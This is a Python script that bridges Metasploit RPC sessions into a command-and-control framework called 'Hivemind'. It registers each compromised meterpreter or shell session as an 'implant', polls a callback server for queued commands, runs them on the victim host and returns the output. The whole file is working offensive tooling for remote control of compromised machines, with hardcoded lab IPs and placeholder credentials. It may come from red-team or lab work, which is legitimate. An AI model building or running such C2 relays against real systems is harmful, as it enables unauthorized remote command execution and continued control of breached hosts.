import json
import time

from pymetasploit3.msfrpc import MsfRpcClient

from Utils.hivemind import Hivemind, ModuleFunc, ParamTypes, Module, Implant

client = MsfRpcClient(password='password', username='user', ssl=False, server='192.168.215.140')

hivemind = Hivemind()
hivemind.set_callback_server('192.168.86.35', 1234)
cmd_func = ModuleFunc('meterpreter shell', 'Run a command in meterpreter shell', ['command'], [ParamTypes.STRING])
mod = Module('meterpreter', 'Module for running meterpreter commands', [cmd_func])
cmd_func2 = ModuleFunc('linux shell', 'Run a command in linux shell', ['command'], [ParamTypes.STRING])
mod2 = Module('linux shell', 'Module for running linux commands', [cmd_func2])

while True:
    time.sleep(5)
    for k, v in client.sessions.list.items():
        print(k)
        print(v)
        implant = Implant(v['tunnel_peer'], f'PAYLOAD {v["via_payload"]}', 'linux', 'Hostname', f'MSF {v["type"]}', '1.0')
        if v['type'] == 'shell':
            implant.add_module(mod2)
        else:
            implant.add_module(mod)
        tmp = hivemind.implant_callback(implant.ip, implant)
        if tmp is not None:
            for x in tmp:
                cmd = json.loads(x['arguments'])['command']
                shell = client.sessions.session(k)
                shell.write(cmd)
                ret = shell.read()
                hivemind.implant_response(implant.ip, x['action_id'], ret)

